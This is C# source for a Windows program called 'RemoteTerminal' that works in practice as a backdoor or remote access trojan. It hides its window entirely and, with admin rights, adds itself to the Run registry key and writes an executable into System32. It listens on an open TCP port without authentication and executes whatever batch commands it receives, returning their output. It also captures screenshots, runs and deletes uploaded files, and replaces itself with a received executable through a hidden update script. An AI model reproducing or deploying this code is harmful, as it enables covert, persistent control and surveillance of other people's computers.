using Microsoft.Win32;
using RemoteControl_Client.Properties;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace RemoteTerminal_Client
{
    public class Window : Form
    {
        private string line = Environment.NewLine;

        private string fileDirectory = Path.GetTempPath() + "RemoteControl_files\\";

        public Process process = null;

        public Thread processThread = null;

        private IContainer components = null;

        [DllImport("user32.dll", SetLastError = true)]
        public static extern bool PostMessage(int hWnd, uint Msg, int wParam, int lParam);

        [DllImport("gdi32.dll")]
        private static extern bool BitBlt(IntPtr hdcDest, int xDest, int yDest, int wDest, int hDest, IntPtr hdcSource, int xSrc, int ySrc, CopyPixelOperation rop);

        [DllImport("user32.dll")]
        private static extern bool ReleaseDC(IntPtr hWnd, IntPtr hDc);

        [DllImport("gdi32.dll")]
        private static extern IntPtr DeleteDC(IntPtr hDc);

        [DllImport("gdi32.dll")]
        private static extern IntPtr DeleteObject(IntPtr hDc);

        [DllImport("gdi32.dll")]
        private static extern IntPtr CreateCompatibleBitmap(IntPtr hdc, int nWidth, int nHeight);

        [DllImport("gdi32.dll")]
        private static extern IntPtr CreateCompatibleDC(IntPtr hdc);

        [DllImport("gdi32.dll")]
        private static extern IntPtr SelectObject(IntPtr hdc, IntPtr bmp);

        [DllImport("user32.dll")]
        public static extern IntPtr GetDesktopWindow();

        [DllImport("user32.dll")]
        public static extern IntPtr GetWindowDC(IntPtr ptr);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern bool SendNotifyMessage(IntPtr hWnd, uint Msg, UIntPtr wParam, string lParam);

        public void NotifyUserEnvironmentVariableChanged()
        {
            SendNotifyMessage((IntPtr)65535, 26u, (UIntPtr)0u, "Environment");
        }

        private DateTime GetLinkerTime(Assembly assembly, TimeZoneInfo target = null)
        {
            string location = assembly.Location;
            byte[] array = new byte[2048];
            using (FileStream fileStream = new FileStream(location, FileMode.Open, FileAccess.Read))
            {
                fileStream.Read(array, 0, 2048);
            }
            int num = BitConverter.ToInt32(array, 60);
            int num2 = BitConverter.ToInt32(array, num + 8);
            DateTime dateTime = new DateTime(1970, 1, 1, 0, 0, 0, DateTimeKind.Utc).AddSeconds(num2);
            TimeZoneInfo destinationTimeZone = target ?? TimeZoneInfo.Local;
            return TimeZoneInfo.ConvertTimeFromUtc(dateTime, destinationTimeZone);
        }

        public Window()
        {
            InitializeComponent();
            if (IsAdministrator())
            {
                SetStartup();
                Environment.SetEnvironmentVariable("remotefiles", fileDirectory, EnvironmentVariableTarget.Machine);
                NotifyUserEnvironmentVariableChanged();
                string path = Path.Combine(Environment.SystemDirectory, "msgbox.exe");
                File.WriteAllBytes(path, Resources.msgbox);
            }
            TcpListener tcpListener = new TcpListener(IPAddress.Any, 28895);
            tcpListener.Start();
            TcpClient client;
            while (true)
            {
                try
                {
                    client = tcpListener.AcceptTcpClient();
                    StringBuilder stringBuilder = new StringBuilder();
                    stringBuilder.AppendLine(Environment.MachineName);
                    stringBuilder.AppendLine("Protocol version : 1.11");
                    stringBuilder.AppendLine("Protocol last updated : " + GetLinkerTime(Assembly.GetExecutingAssembly()).ToString("MMMM dd yyyy, hh:mm tt"));
                    stringBuilder.AppendLine("Protocol receiving buffer size : 8192");
                    stringBuilder.AppendLine("Environment variable for files directory : %remotefiles%");
                    stringBuilder.AppendLine();
                    stringBuilder.AppendLine("Capabilities : Simple file history; Simple file management; Batch code processor; Batch console monitoring; Multiple connections support; Screenshot capture support; Remote client updating; Background mp3 support");
                    try
                    {
                        if (!Directory.Exists(fileDirectory))
                        {
                            Directory.CreateDirectory(fileDirectory);
                        }
                        DirectoryInfo directoryInfo = new DirectoryInfo(fileDirectory);
                        FileInfo[] files = directoryInfo.GetFiles("*.*");
                        FileInfo[] array = files;
                        foreach (FileInfo fileInfo in array)
                        {
                            stringBuilder.AppendLine("\\" + fileInfo.Name);
                        }
                    }
                    catch
                    {
                    }
                    byte[] bytes = Encoding.UTF8.GetBytes(stringBuilder.ToString());
                    client.GetStream().Write(bytes, 0, bytes.Length);
                    Thread thread = new Thread((ThreadStart)delegate
                    {
                        run(client);
                    });
                    thread.Name = "Connection Thread";
                    thread.Start();
                }
                catch (Exception ex)
                {
                    if (Debugger.IsAttached)
                    {
                        Console.WriteLine("An error has occured during the connection of a client.");
                        Console.WriteLine(ex.Message);
                        Console.WriteLine(ex.StackTrace);
                    }
                    else
                    {
                        log(ex);
                    }
                    Thread.Sleep(250);
                }
            }
        }

        private void log(Exception ex)
        {
            File.AppendAllText(Path.GetTempPath() + "RemoteControl-Client.log", DateTime.Now.ToLocalTime() + " ^ " + ex.Message + line + line + ex.StackTrace + line + line);
        }

        private void log(String message)
        {
            File.AppendAllText(Path.GetTempPath() + "RemoteControl-Client.log", DateTime.Now.ToLocalTime() + " ^ " + message + line + line);
        }

        private byte[] trimByteArray(byte[] input)
        {
            if (input.Length > 1)
            {
                int num = input.Length - 1;
                while (input[num] == 0)
                {
                    num--;
                    if (num < 0)
                    {
                        return input;
                    }
                }
                byte[] array = new byte[num + 1];
                for (int i = 0; i < num + 1; i++)
                {
                    array[i] = input[i];
                }
                return array;
            }
            return input;
        }

        public static bool IsAdministrator()
        {
            WindowsIdentity current = WindowsIdentity.GetCurrent();
            WindowsPrincipal windowsPrincipal = new WindowsPrincipal(current);
            return windowsPrincipal.IsInRole(WindowsBuiltInRole.Administrator);
        }

        private void SetStartup()
        {
            RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            registryKey.SetValue("RemoteTerminal", Application.ExecutablePath.ToString());
        }

        private void handleStandardOutput(TcpClient client)
        {
            string str = ((IPEndPoint)client.Client.RemoteEndPoint).Address.ToString();
            try
            {
                while (process != null && (!process.StandardOutput.EndOfStream || !process.HasExited))
                {
                    StringBuilder stringBuilder = new StringBuilder();
                    while (process.StandardOutput.Peek() > -1)
                    {
                        char[] array = new char[1];
                        int num = process.StandardOutput.ReadBlock(array, 0, array.Length);
                        if (num == -1)
                        {
                            break;
                        }
                        stringBuilder.Append(array);
                    }
                    string text = stringBuilder.ToString();
                    if (text.Length > 0)
                    {
                        byte[] bytes = Encoding.UTF8.GetBytes(text);
                        client.GetStream().Write(bytes, 0, bytes.Length);
                        client.GetStream().Flush();
                        if (text.Length > 0 && Debugger.IsAttached)
                        {
                            Console.WriteLine(str + " => " + text);
                        }
                    }
                }
            }
            catch
            {
            }
            endCommand(client);
        }

        public void handleStandardInput(TcpClient client, string input)
        {
            try
            {
                if (process != null && !process.HasExited)
                {
                    process.StandardInput.Write(input);
                    process.StandardInput.Flush();
                }
            }
            catch
            {
                endCommand(client);
            }
        }

        public void endCommand(TcpClient client)
        {
            try
            {
                if (process != null && !process.HasExited)
                {
                    process.Kill();
                }
                for (int i = 0; i < 20; i++)
                {
                    byte[] bytes = Encoding.UTF8.GetBytes("</endCommand>");
                    client.GetStream().Write(bytes, 0, bytes.Length);
                    client.GetStream().Flush();
                }
            }
            catch
            {
            }
        }

        private void run(TcpClient client)
        {
            string str = ((IPEndPoint)client.Client.RemoteEndPoint).Address.ToString();
            try
            {
                if (Debugger.IsAttached)
                {
                    Console.WriteLine(str + " has connected to the server");
                }
                while (true)
                {
                    byte[] array = new byte[16384];
                    int num = client.GetStream().Read(array, 0, array.Length);
                    string @string = Encoding.UTF8.GetString(trimByteArray(array));
                    if (@string.Length <= 0 || num <= 0)
                    {
                        break;
                    }
                    @string = @string.Replace("cmd /c @update", "");
                    if (@string.Length > 0 && Debugger.IsAttached)
                    {
                        Console.WriteLine(str + " -> " + @string);
                    }
                    if (@string.StartsWith("cmd /c @delfile"))
                    {
                        File.Delete(fileDirectory + @string.Split('(')[1].Split(')')[0]);
                    }
                    else if (@string.StartsWith("cmd /c @runfile"))
                    {
                        string filename = @string.Split('(')[1].Split(')')[0];
                        string absoluteFilePath = fileDirectory + filename;
                        log(filename);
                        log(absoluteFilePath);
                        if (filename.EndsWith(".mp3"))
                        {
                            try
                            {
                                log("Opening with Windows Media Player..");
                                WMPLib.WindowsMediaPlayer wplayer = new WMPLib.WindowsMediaPlayer();
                                wplayer.URL = absoluteFilePath;
                                wplayer.controls.play();
                            }
                            catch (Exception ex)
                            {
                                log(ex);
                            }
                        }
                        else
                        {
                            Process.Start(absoluteFilePath);
                        }
                    }
                    else if (@string.StartsWith("cmd /c @commandWrite"))
                    {
                        string input = @string.Replace("cmd /c @commandWrite & ", "");
                        handleStandardInput(client, input);
                    }
                    else if (@string.StartsWith("cmd /c @endCommand"))
                    {
                        if (processThread != null && processThread.IsAlive)
                        {
                            processThread.Abort();
                            Thread.Sleep(100);
                        }
                        if (this.process != null && !this.process.HasExited)
                        {
                            this.process.Kill();
                        }
                        endCommand(client);
                    }
                    else if (@string.StartsWith("cmd /c @screenshot"))
                    {
                        int num2 = 1;
                        Bitmap bitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
                        switch (num2)
                        {
                            case 0:
                                using (Graphics graphics = Graphics.FromImage(bitmap))
                                {
                                    graphics.CopyFromScreen(Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y, 0, 0, bitmap.Size, CopyPixelOperation.SourceCopy);
                                }
                                break;
                            case 1:
                                {
                                    Size size = Screen.PrimaryScreen.Bounds.Size;
                                    IntPtr desktopWindow = GetDesktopWindow();
                                    IntPtr windowDC = GetWindowDC(desktopWindow);
                                    IntPtr intPtr = CreateCompatibleDC(windowDC);
                                    IntPtr intPtr2 = CreateCompatibleBitmap(windowDC, size.Width, size.Height);
                                    IntPtr bmp = SelectObject(intPtr, intPtr2);
                                    BitBlt(intPtr, 0, 0, size.Width, size.Height, windowDC, 0, 0, (CopyPixelOperation)1087111200);
                                    bitmap = Image.FromHbitmap(intPtr2);
                                    SelectObject(intPtr, bmp);
                                    DeleteObject(intPtr2);
                                    DeleteDC(intPtr);
                                    ReleaseDC(desktopWindow, windowDC);
                                    break;
                                }
                        }
                        bitmap.Save(client.GetStream(), ImageFormat.Png);
                        client.GetStream().Flush();
                        Thread.Sleep(200);
                        client.GetStream().Write(Encoding.UTF8.GetBytes("</endFile>"), 0, Encoding.UTF8.GetBytes("</endFile>").Length);
                        client.GetStream().Flush();
                    }
                    else if (@string.StartsWith("cmd /c @file"))
                    {
                        FileStream fileStream = new FileStream(fileDirectory + @string.Split('(')[1].Split(')')[0], FileMode.Create);
                        while (true)
                        {
                            byte[] array2 = new byte[16384];
                            int num3 = client.GetStream().Read(array2, 0, array2.Length);
                            if (num3 <= -1)
                            {
                                break;
                            }
                            if (num3 > 0)
                            {
                                if (Encoding.UTF8.GetString(array2).Trim().Contains("</endFile>"))
                                {
                                    break;
                                }
                                fileStream.Write(array2, 0, num3);
                            }
                        }
                        fileStream.Close();
                    }
                    else if (@string.StartsWith("cmd /c @flash"))
                    {
                        try
                        {
                            Path.GetFileName(Assembly.GetEntryAssembly().Location);
                            string location = Assembly.GetEntryAssembly().Location;
                            FileStream fileStream = new FileStream(Path.GetTempPath() + "\\update.exe", FileMode.Create);
                            while (true)
                            {
                                byte[] array2 = new byte[16384];
                                int num3 = client.GetStream().Read(array2, 0, array2.Length);
                                if (num3 <= -1)
                                {
                                    break;
                                }
                                if (num3 > 0)
                                {
                                    if (Encoding.UTF8.GetString(array2).Trim().Contains("</endFile>"))
                                    {
                                        break;
                                    }
                                    fileStream.Write(array2, 0, num3);
                                }
                            }
                            fileStream.Close();
                            string text = Path.GetTempPath() + "\\update.bat";
                            File.WriteAllText(text, "move /y \"" + Path.GetTempPath() + "\\update.exe\" \"" + location + "\"" + Environment.NewLine + "start \"\" \"" + location + "\"" + Environment.NewLine + "start \"\" \"cmd /c del \"" + text + "\"");
                            Process process = new Process();
                            process.StartInfo.FileName = Path.GetTempPath() + "\\update.bat";
                            process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                            process.Start();
                            Environment.Exit(0);
                        }
                        catch (Exception ex)
                        {
                            log(ex);
                        }
                    }
                    else
                    {
                        bool flag = false;
                        if (@string.StartsWith("disableConsole"))
                        {
                            flag = false;
                        }
                        if (@string.Contains("cmd /c @processCommand(enableConsole) & "))
                        {
                            flag = true;
                            @string = @string.Replace("cmd /c @processCommand(enableConsole) & ", "");
                        }
                        else if (@string.Contains("cmd /c @processCommand(disableConsole) & "))
                        {
                            flag = false;
                            @string = @string.Replace("cmd /c @processCommand(disableConsole) & ", "");
                        }
                        if (@string.Length > 0)
                        {
                            while (client.GetStream().DataAvailable)
                            {
                                byte[] array3 = new byte[16384];
                                client.GetStream().Read(array3, 0, array3.Length);
                                string text2 = Encoding.UTF8.GetString(array3).Trim();
                                if (text2.Length > 0)
                                {
                                    @string += text2;
                                }
                            }
                            if (this.process != null && !this.process.HasExited)
                            {
                                this.process.Kill();
                            }
                            if (processThread != null && processThread.IsAlive)
                            {
                                processThread.Abort();
                                processThread = null;
                            }
                            Thread.Sleep(500);
                            string[] contents = @string.Split(new string[2]
							{
								"\n",
								"\r\n"
							}, StringSplitOptions.RemoveEmptyEntries);
                            File.WriteAllText(Path.GetTempPath() + "batch.bat", "", Encoding.ASCII);
                            File.AppendAllLines(Path.GetTempPath() + "batch.bat", contents, Encoding.ASCII);
                            ProcessStartInfo processStartInfo = new ProcessStartInfo(Path.GetTempPath() + "batch.bat");
                            processStartInfo.WindowStyle = ProcessWindowStyle.Normal;
                            processStartInfo.WorkingDirectory = Environment.CurrentDirectory;
                            if (flag)
                            {
                                processStartInfo.UseShellExecute = false;
                                processStartInfo.CreateNoWindow = true;
                                processStartInfo.RedirectStandardOutput = true;
                                processStartInfo.RedirectStandardInput = true;
                            }
                            this.process = Process.Start(processStartInfo);
                            if (flag)
                            {
                                processThread = new Thread((ThreadStart)delegate
                                {
                                    handleStandardOutput(client);
                                });
                                processThread.Start();
                            }
                        }
                    }
                }
                try
                {
                    client.Close();
                }
                catch
                {
                }
                if (Debugger.IsAttached)
                {
                    Console.WriteLine(str + " has disconnected from the server.");
                }
            }
            catch (Exception ex)
            {
                try
                {
                    client.Close();
                }
                catch
                {
                }
                if (Debugger.IsAttached)
                {
                    Console.WriteLine(str + " has disconnected from the server.");
                    Console.WriteLine("An error has occured with one of the connected clients.");
                    Console.WriteLine(ex.Message);
                    Console.WriteLine(ex.StackTrace);
                }
                else
                {
                    log(ex);
                }
            }
        }

        protected override void Dispose(bool disposing)
        {
            if (disposing && components != null)
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        private void InitializeComponent()
        {
            SuspendLayout();
            base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
            base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            base.ClientSize = new System.Drawing.Size(0, 0);
            base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            base.Name = "Window";
            base.Opacity = 0.0;
            base.ShowIcon = false;
            base.ShowInTaskbar = false;
            base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            base.WindowState = System.Windows.Forms.FormWindowState.Minimized;
            ResumeLayout(false);
        }
    }
}
